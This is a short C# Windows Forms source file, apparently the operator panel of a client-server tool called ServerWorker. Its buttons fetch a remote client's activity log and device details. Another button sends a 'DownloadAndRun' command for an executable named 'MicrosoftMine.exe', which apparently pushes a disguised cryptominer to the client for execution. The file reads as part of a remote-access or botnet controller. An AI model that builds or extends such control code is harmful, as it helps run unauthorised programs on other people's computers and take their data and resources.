using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ServerWorker
{
    public partial class FormUserCard : Form
    {

        private Messenger messenger;
        private LogUserCard log;

        public FormUserCard(Messenger test)
        {
            InitializeComponent();
            messenger = test;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Functions.onGettingLog += () => DrawLog(messenger.clientLog.messages);
            messenger.RequestLog();
            log = new LogUserCard();
            log.Show();
            log.Text = "Ожидайте, идет получение лога..";
        }

        private void DrawLog(List<string> actions)
        {
            log.Text = "Лог";
            log.DrawNewLog(actions);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Functions.OnGettingInfoDevice += () => DrawInfoDevice(messenger.setting.infoDevice);
            string message = "GetInfoDevice";
            messenger.SendMessage(message);
        }

        private void DrawInfoDevice(List<string> _params)
        {
            foreach (string str in _params)
            {
                try
                {
                    if (listBox2.InvokeRequired) listBox2.BeginInvoke(new Action(() => { listBox2.Items.Add(str); }));
                    else listBox2.Items.Add(str);
                }
                catch
                { }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string message = "DownloadAndRun"+"_"+"MicrosoftMine.exe";
            messenger.SendMessage(message);
        }
    }
}
